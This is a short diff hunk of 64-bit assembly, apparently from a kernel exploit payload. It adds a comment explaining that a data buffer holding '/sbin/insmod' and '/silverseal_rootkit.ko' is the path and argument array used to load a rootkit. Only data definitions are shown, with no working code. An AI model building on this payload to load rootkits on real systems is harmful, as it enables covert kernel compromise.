@@ -12,6 +12,7 @@ BITS 64
 work_struct_data:
     times   32 db 0
 
+; insmod path and argv[] array, used to load the rootkit.
 path_buffer:
     db      "/sbin/insmod", 0
     db      "/silverseal_rootkit.ko", 0
